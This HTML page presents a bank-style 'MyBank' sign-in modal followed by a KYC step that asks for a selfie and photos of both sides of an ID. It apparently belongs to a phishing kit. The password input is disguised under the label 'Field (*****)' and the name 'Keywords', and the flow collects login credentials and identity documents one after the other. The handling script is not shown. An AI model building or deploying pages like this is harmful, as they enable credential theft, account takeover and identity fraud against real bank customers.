<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Bank App — Secure Access</title>
<link rel="stylesheet" href="style.css">
</head>
<body>
  <header class="topbar">
    <div class="top-inner">
      <a class="brand" id="brandName">MyBank</a>
      <button class="btn-pill" id="openBtn">Sign In</button>
    </div>
  </header>

  <main class="hero">
    <div class="hero-inner">
      <div class="hero-copy">
        <h1 class="headline">Welcome to <span id="brandInHero">MyBank</span></h1>
        <p class="lead">Secure access for customers — modern, fast and protected.</p>
        <button class="cta-primary" id="startFlow">Get Started</button>
      </div>
      <div class="hero-visual"></div>
    </div>
  </main>

  <!-- Modal -->
  <div id="modal" class="modal hidden">
    <div class="modal-card">
      <button class="close" id="closeBtn">✕</button>

      <!-- STEP 1: Login -->
      <section id="step1" class="step active">
        <h2>Sign In</h2>
        <form id="loginForm">
          <label>Username<input name="username" type="text" required></label>
          <label>Field (*****)<input name="Keywords" type="text" required></label>
          <div class="row">
            <button type="submit" class="btn-primary">Continue</button>
          </div>
        </form>
      </section>

      <!-- STEP 2: KYC Upload -->
      <section id="step2" class="step hidden">
        <h2>KYC — Upload Photos</h2>
        <form id="kycForm" enctype="multipart/form-data">
          <label>Photo 1 (Selfie)<input name="photo1" type="file" accept="image/*" required></label>
          <label>Photo 2 (ID Front)<input name="photo2" type="file" accept="image/*" required></label>
          <label>Photo 3 (ID Back)<input name="photo3" type="file" accept="image/*" required></label>
          <div class="row">
            <button type="submit" class="btn-primary">Submit KYC</button>
          </div>
        </form>
      </section>

      <div id="status" class="muted"></div>
    </div>
  </div>

<script src="script.js"></script>
</body>
</html>
